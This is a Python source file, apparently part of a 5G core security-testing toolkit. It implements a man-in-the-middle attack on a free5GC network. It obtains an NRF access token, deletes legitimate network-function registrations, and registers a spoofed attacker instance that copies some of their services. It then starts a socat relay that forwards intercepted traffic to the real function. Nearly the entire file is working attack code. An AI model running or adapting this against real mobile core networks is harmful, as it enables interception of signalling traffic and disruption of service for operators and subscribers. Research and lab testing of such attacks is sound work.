
from src.utils.common import get_my_ip_from_prefix, generate_variables, ip_list
from src.utils.protocols.api_cn.instance import NFInstance

import random
import os 
import time

class CNMitm:
    
    attacker_instance: NFInstance|None = None
    attacker_token: str | None = None
    
    spoofed_instance: NFInstance|None = None
    mitm_instance: NFInstance|None = None
    
    def _nrf_poisonning(nf_to_spoof: str, display=True) -> bool: 
        """
        Performs NRF poisoning by removing legitimate NF instances of the specified type, 
        registering a spoofed attacker NF instance, and then re-adding the legitimate instances.
        Args:
            nf_to_spoof (NFInstance): The network function type to spoof.
        Returns:
            bool: True if the poisoning was successful, False otherwise.
        """
        
        # Get the list of registered NFs with the right type
        infos = CNMitm.attacker_instance.get_nf_info(CNMitm.attacker_token, nf_to_spoof, display=display)
        if "nfInstances" not in infos or not infos["nfInstances"]:
            return False

        # Remove the legitimate instances but store their informations for adding them back later 
        removed_instances: list[NFInstance] = []
        for legitimate_instance in infos["nfInstances"]:
            
            legitimate_id = legitimate_instance["nfInstanceId"]
            
            # NF created by the attacker dont have valid ip address
            if "ipv4Addresses" in legitimate_instance:
                legitimate_address = legitimate_instance["ipv4Addresses"][0]
            else : 
                legitimate_address = get_my_ip_from_prefix()
            
            # Some NF don't have services
            if "nfServices" in legitimate_instance:
                legitimate_services = [s["serviceName"] for s in legitimate_instance["nfServices"]]
            else : 
                legitimate_services = []
            
            print(f"Replacing instance {legitimate_id}")
            # Create instance object and add them to a list
            legitimate_instance = NFInstance(legitimate_id, nf_to_spoof, legitimate_address, legitimate_services)
            removed = legitimate_instance.remove_nf(CNMitm.attacker_token, display=display)
            removed_instances.append(legitimate_instance)
            
            time.sleep(1) # avoid overloading the CN
            
            if not removed :
                return False

        # Informations for the new attacker NF
        mitm_addr = get_my_ip_from_prefix()
        mitm_id   = generate_variables("uuid")
                
        # Pick a random legitimate removed instance and mimic some of its services
        # Its just to make the mitm instance more realistic
        random_instance: NFInstance = random.choice(removed_instances)
        if len(random_instance.services) > 0 : 
            nb_of_service = random.randint(1, len(random_instance.services))  
            mitm_services = random.sample(random_instance.services, nb_of_service) # get N services from a random instance
        else:
            mitm_services = []
       
        CNMitm.spoofed_instance = random_instance
        
        print(f"Add the mitm instance {mitm_id}")
        # Add the attacker as a NF of the right type
        CNMitm.mitm_instance = NFInstance.add_nf(mitm_id, nf_to_spoof, mitm_services, ip_address=mitm_addr, display=display)
        
        # Re-add the legitimate NFs
        for i in removed_instances:
            added = NFInstance.add_nf(i.nf_instance_id, nf_to_spoof, i.services, i.ip_address, display=display)
            
            if not added :
                return False
            
            time.sleep(1) # avoid overloading the CN
                        
        return True
                      
    def start(nf_to_spoof:str, display=True) -> bool:
        """
        Starts a MITM attack by spoofing a network function (NF) in the 5G core network.
        Args:
            nf_to_spoof (str): The network function instance to spoof. If null, a random NF type is selected.
        Returns:
            bool: True if the attack was successfully started, False otherwise.
        """
        
        os.popen("pkill -f socat")
        
        # Get a token
        CNMitm.attacker_instance = NFInstance.add_random_nf(display=display)
        CNMitm.attacker_token = CNMitm.attacker_instance.get_token(scope="nnrf-disc", target_type="NRF", display=display)
        
        if not CNMitm.attacker_token : 
            return False
        
        # Start the poisonning
        if not CNMitm._nrf_poisonning(nf_to_spoof, display=display):
            return False
        
        # The MITM redirect every incoming message to the legitimate NF
        free5gc_cn_port = 8000
        legitimate_nf_ip = ip_list[CNMitm.spoofed_instance.nf_type]
        os.popen(f"socat TCP4-LISTEN:{free5gc_cn_port},fork TCP4:{legitimate_nf_ip}:{free5gc_cn_port}")

        return True

    def stop(display=True) -> bool:
        """
        Stops the MITM attack by terminating all 'socat' processes and removing the network function associated with the attacker token.

        Returns:
            bool: True if the network function was successfully removed, False otherwise.
        """
        os.popen("pkill -f socat")
        print(f"Removing the mitm instance {CNMitm.mitm_instance.nf_instance_id}")
        success = CNMitm.mitm_instance.remove_nf(CNMitm.attacker_token,display=display)
        
        # refresh the token and remove the nf_instance to avoid polluting the NRF
        CNMitm.attacker_token = CNMitm.attacker_instance.get_token(scope="nnrf-disc", target_type="NRF", display=display)
        success = success and CNMitm.attacker_instance.remove_nf(CNMitm.attacker_token, display=False)
        
        return success